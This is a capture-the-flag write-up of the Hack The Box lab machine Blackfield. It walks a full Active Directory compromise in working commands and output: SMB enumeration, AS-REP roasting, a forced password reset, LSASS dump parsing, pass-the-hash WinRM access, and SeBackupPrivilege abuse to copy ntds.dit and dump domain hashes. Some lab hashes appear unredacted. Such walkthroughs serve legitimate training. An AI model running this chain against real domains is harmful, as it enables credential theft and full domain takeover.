---
title: HTB - Blackfield
date: 2024-03-20
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, cascade, nmap, netexec, nxc, smb, null-session, active-directory, windows, winrm, evil-winrm, ntds, backup-operators, diskshadow, robocopy, system-hive, bloodhound, bloodhound-py, secretsdump, impacket, asreproasting, getnpusers, pypykatz, forcechangepassword, sebackupprivilege]
img_path: /assets/htb/fullpwn/blackfield
published: true
image:
    path: machine_info.png
---

## HTB: Blackfield

>[Blackfield Box](https://app.hackthebox.com/machines/255)

![](blackfield_diagram.png){: .normal}

## Walkthrough Summary

|Step|Action|Tool|Achieved|
|-|-|-|-|
|1|SMB Enumeration|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained usernames|
|2|ASREPRoasting|[GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)|Obtained password for *support*|
|3|Domain Enumeration|[BloodHound.py](https://github.com/dirkjanm/BloodHound.py), [BloodHound](https://github.com/BloodHoundAD/BloodHound)|Obtained credentials for *audit2020* (lateral movement)|
|4|SMB Enumeration|[NetExec](https://github.com/Pennyw0rth/NetExec), [pypykatz](https://github.com/skelsec/pypykatz)|Obtained hash for _svc\_backup_ (initial foothold)|
|5|Privilege Exploitation|[diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), [robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)|Exfiltrated _ntds.dit_ & _system.hive_|
|6|Hash Dump|[SecretsDump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), [NetExec](https://github.com/Pennyw0rth/NetExec)|Compromised domain|

## Attack Chain Reproduction Steps

TCP all-ports scan:

```bash
$ sudo nmap 10.10.10.192 -T4 -p- -A -open

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-20 22:39:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Important things to note based on Nmap's output:  
* Domain name: `BLACKFIELD.LOCAL`
* Host name: `DC01`
* WinRM available (`5985`)

Before proceed to enumerate the SMB and LDAP services, we should add `blackfield.local` & `dc01.blackfield.local` to our local DNS file (`/etc/hosts`).

```bash
# enumerating SMB shares
$ nxc smb 10.10.10.192 -u 'guest' -p '' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest:
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
```

Spidering the `profile$` share reveals various usernames:

```bash
$ nxc smb 10.10.10.192 -u 'anonymous' -p '' --spider 'profiles$' --regex .
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\anonymous:
SMB         10.10.10.192    445    DC01             [*] Started spidering
SMB         10.10.10.192    445    DC01             [*] Spidering .
SMB         10.10.10.192    445    DC01             //10.10.10.192/profiles$/. [dir]
SMB         10.10.10.192    445    DC01             //10.10.10.192/profiles$/.. [dir]
SMB         10.10.10.192    445    DC01             //10.10.10.192/profiles$/AAlleni [dir]
SMB         10.10.10.192    445    DC01             //10.10.10.192/profiles$/ABarteski [dir]
SMB         10.10.10.192    445    DC01             //10.10.10.192/profiles$/ABekesz [dir]
<SNIP>
SMB         10.10.10.192    445    DC01             [*] Done spidering (Completed in 55.86900997161865)

# create a username list
$ nxc smb 10.10.10.192 -u 'anonymous' -p '' --spider 'profiles$' --regex . > nxc_spider.txt
$ cat nxc_spider.txt | grep '[dir]' | cut -d'/' -f5 | cut -d' ' -f1 | sort | uniq > domain_users.txt
```

Check for **ASREPRoastable** accounts:

```bash
$ getnpusers blackfield.local/ -dc-ip 10.10.10.192 -no-pass -usersfile domain_users.txt | grep 'krb5\|User'
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:9f6ca396e535881d3e763ec8b9ac02d3$5601e4935152a25b38784ffcec4dfb846fad6acd52b0337af240a62083dc59eca7344b3b4b4b6cbe5c925f4ca3378aecd925e0021b55b64590227069c7709c56494f96d7c0b4677df2cb2b99b8a4196443656485462f6feb37fdeeac1ca82eb0d381e3807ced88ca442249c21ba2e6ae354a2de9fe31f33283730232a00b62520734ec9c70b307be113472519ef94d6cd4f1d5276aaed7bcd3d9b719ea7eec729b8afa7bd71e88ca0c99837eb91bc18d4526ce67895d74a4bc61fc3ae6922c44d3213f1b56a7af8d2009e59371d1778d19ccf3be01c568a097d3545a053691af1e553bd8ed0f74d75ba63b71afb00a99678b4be9
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We have three valid usernames, one of which is ASREPRoastable and we can crack it hash:

```bash
$ hashcat -m 18200 support_hash /usr/share/wordlists/rockyou.txt

<SNIP>
$krb5asrep$23$support@BLACKFIELD.LOCAL:0fb<REDACTED>e87:#0<REDACTED>ht
<SNIP>
```

Now we have credentials, we can obtain group information about the other two users:

```bash
$ nxc ldap 10.10.10.192 -u 'support' -p '#0<REDACTED>ht' -M groupmembership -o USER=audit2020
<SNIP>
GROUPMEM... 10.10.10.192    389    DC01             [+] User: audit2020 is member of following groups:
GROUPMEM... 10.10.10.192    389    DC01             Domain Users

$ nxc ldap 10.10.10.192 -u 'support' -p '#0<REDACTED>ht' -M groupmembership -o USER=svc_backup
<SNIP>
GROUPMEM... 10.10.10.192    389    DC01             [+] User: svc_backup is member of following groups:
GROUPMEM... 10.10.10.192    389    DC01             Remote Management Users
GROUPMEM... 10.10.10.192    389    DC01             Backup Operators
GROUPMEM... 10.10.10.192    389    DC01             Domain Users
```

We can also collect domain information and let **Bloodhound** analyze it:

```bash
$ bloodhound-python -u support -p '#0<REDACTED>ht' -dc dc01.blackfield.local -c all -d BLACKFIELD.LOCAL -ns 10.10.10.192
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
<SNIP>
INFO: Querying computer: DC01.BLACKFIELD.local
WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 06S
```

It seems that the account `support` can change the password of the account `audit2020`:

![](blackfield_support_change_pass.png)

![](blackfield_bh_help.png)

![](blackfield_bh_change_pass.png)

```bash
# change user's password
$ net rpc password 'audit2020' 'p@ssw0rd!' -U "blackfield.local/support%#0<REDACTED>ht" -S dc01.blackfield.local

# confirm credentials
$ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:p@ssw0rd!
```

>_We can also change the user's password using [`rpcclient`](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)._

Check share access for `audit2020`:

```bash
$ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!' --share forensic -M spider_plus
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:p@ssw0rd!
SPIDER_P... 10.10.10.192    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.10.192    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.10.10.192    445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.10.10.192    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.10.192    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.10.192    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.10.192    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
SPIDER_P... 10.10.10.192    445    DC01             [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.10.192.json".
SPIDER_P... 10.10.10.192    445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_P... 10.10.10.192    445    DC01             [*] SMB Readable Shares:  5 (forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_P... 10.10.10.192    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_P... 10.10.10.192    445    DC01             [*] Total folders found:  368
SPIDER_P... 10.10.10.192    445    DC01             [*] Total files found:    725
SPIDER_P... 10.10.10.192    445    DC01             [*] File size average:    978.9 KB
SPIDER_P... 10.10.10.192    445    DC01             [*] File size min:        0 B
SPIDER_P... 10.10.10.192    445    DC01             [*] File size max:        125.87 MB
```

It seems that among the files there is a **LSASS memory dump** which we can download locally:

```bash
# read output file
$ jq . /tmp/nxc_spider_plus/10.10.10.192.json
<SNIP>
    },
    "memory_analysis/lsass.zip": {
      "atime_epoch": "2020-05-28 21:25:08",
      "ctime_epoch": "2020-05-28 21:25:01",
      "mtime_epoch": "2020-05-28 21:29:24",
      "size": "39.99 MB"
    },
<SNIP>

# download file
$ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!' --share forensic --get-file memory_analysis/lsass.zip lsass.zip
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:p@ssw0rd!
SMB         10.10.10.192    445    DC01             [*] Copying "memory_analysis/lsass.zip" to "lsass.zip"
SMB         10.10.10.192    445    DC01             [+] File "memory_analysis/lsass.zip" was downloaded to "lsass.zip"
```

We can use [`pypykatz`](https://github.com/skelsec/pypykatz) to extract the data from the LSASS file:

```bash
# unzip the lsass dump
$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP

# extract the data
$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
<SNIP>
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 96<REDACTED>0d
<SNIP>
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
<SNIP>
```

The hash for the `Administrator` account does not work, but for the `svc_backup` account does:

```bash
$ nxc winrm 10.10.10.192 -u svc_backup -H 96<REDACTED>0d
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:96<REDACTED>0d (Pwn3d!)
```

Get a shell as `svc_backup` and compromise `user.txt`:

```bash
$ evil-winrm -i 10.10.10.192 -u svc_backup -H 96<REDACTED>0d

<SNIP>
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type ..\desktop\user.txt
39<REDACTED>43
```

Check user's information:

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

<SNIP>

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
<SNIP>


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We can exploit the **SeBackupPrivilege** (*[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)*) and dump the `ntds.dit` database by:

- Writing a small script for the **[diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)** utility to expose the *c:* drive
- Convert the script in a Windows-compatible format
- Upload the script on the target
- Move to a directory with write access
- Expose the shadow copy
- Download the `ntds.dit` database

```bash
# write a diskshadow script
$ cat diskshadow_script
set context persistent nowriters
add volume c: alias random
create
expose %random% z:

# convert file into a Windows-compatible format
$ sudo unix2dos diskshadow_script
unix2dos: converting file diskshadow_script to DOS format...
```

Next, within the WinRM session:

```bash
# upload script
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload diskshadow_script

Info: Uploading /home/kali/htb/ad_track/diskshadow_script to C:\Users\svc_backup\Documents\diskshadow_script

Data: 120 bytes of 120 bytes copied

Info: Upload successful!

# move within a writeable directory
*Evil-WinRM* PS C:\Windows\Temp> cd c:\windows\temp

# expose the shadow copy
*Evil-WinRM* PS C:\Windows\Temp> diskshadow /s diskshadow_script
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  3/21/2024 6:40:33 AM

-> set context persistent nowriters
-> add volume c: alias random
-> create
Alias random for shadow ID {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b33e3fe9-4ce7-481a-8ce7-968ce59f77ec} set as environment variable.

Querying all shadow copies with the shadow copy set ID {b33e3fe9-4ce7-481a-8ce7-968ce59f77ec}

        * Shadow copy ID = {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a}               %random%
                - Shadow copy set: {b33e3fe9-4ce7-481a-8ce7-968ce59f77ec}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 3/21/2024 6:40:34 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %random% z:
-> %random% = {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a}
The shadow copy was successfully exposed as z:\.
->

# copy the ntds.dit database
*Evil-WinRM* PS C:\Windows\Temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, March 21, 2024 6:44:01 AM
   Source : z:\windows\ntds\
     Dest : C:\Windows\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
<SNIP>
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           109734697 Bytes/sec.
   Speed :            6279.069 MegaBytes/min.
   Ended : Thursday, March 21, 2024 6:44:01 AM

# download the file
*Evil-WinRM* PS C:\Windows\Temp> download ntds.dit

Info: Downloading C:\Windows\Temp\ntds.dit to ntds.dit

Info: Download successful!
```

We also need to exfiltrate the `system.hive` file:

```bash
# make a copy of the file
*Evil-WinRM* PS C:\windows\temp> reg save HKlM\SYSTEM C:\windows\temp\system.hive
The operation completed successfully.

# download the file
*Evil-WinRM* PS C:\> download system.hive

Info: Downloading C:\\system.hive to system.hive

Info: Download successful!
```

Now the `Administrator` hash can be easily dumped which let us compromise the `root.txt` file:

```bash
# dump the administrator hash
$ secretsdump -ntds ntds.dit -system system.hive LOCAL | grep Admin
Administrator:500:aad3b435b51404eeaad3b435b51404ee:18<REDACTED>ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1

# compromise the root.txt file
$ nxc smb 10.10.10.192 -u administrator -H 18<REDACTED>ee -x 'type c:\users\administrator\desktop\root.txt'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:18<REDACTED>ee (Pwn3d!)
SMB         10.10.10.192    445    DC01             [+] Executed command via wmiexec
SMB         10.10.10.192    445    DC01             43<REDACTED>cb
```